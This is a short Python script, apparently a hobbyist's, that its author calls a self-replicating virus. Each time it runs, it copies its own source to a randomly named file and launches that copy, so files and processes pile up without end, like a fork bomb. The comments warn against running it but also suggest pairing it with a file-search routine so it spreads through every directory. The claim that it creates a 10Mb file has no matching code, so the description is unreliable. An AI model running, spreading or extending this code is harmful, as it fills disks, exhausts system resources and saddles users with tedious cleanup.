# A simple virus that keep replicating itself (and a 10Mb file in the 
# same directory). It's not a simple "copy and paste" procedure...you
# can delete the new files while the program is running. This won't
# terminate the whole program cause it's constantly runing the last 
# generated file and makes a replica of it and so on.

I = open(__file__).read()
import random,subprocess,os
NAME = str(random.randint(1,1000000))
with open(NAME+'.py','w') as f: # our new pyhton file
    f.write(I)
my_file = '{}.py'.format(NAME)
process = subprocess.Popen(["python", my_file], shell =False)
# excecuting the new python file and therefore generating the 
# next cycle.

# Please note that:

# 1) i won't recommend running this code on your machine 
# (or on anyone else's pc for this matter).

# 2) to stop the program, just press ctrl + c in the cmd.

# 3) please do not infuse this code with my "File search in python" code.
# the result could be catastrophic.imagine a program that spreads seeds of
# a self replicating code, across all your folders and directories. as this
# tree expands...=). But i don't think it would go crazy though. i think there
# must be some sort of overflow control in windows for such cases. but the 
# pain of cleaning every byproduct of this code is quite cumbersome, that's
# why i don't recommend trying it out as i myself didn't! 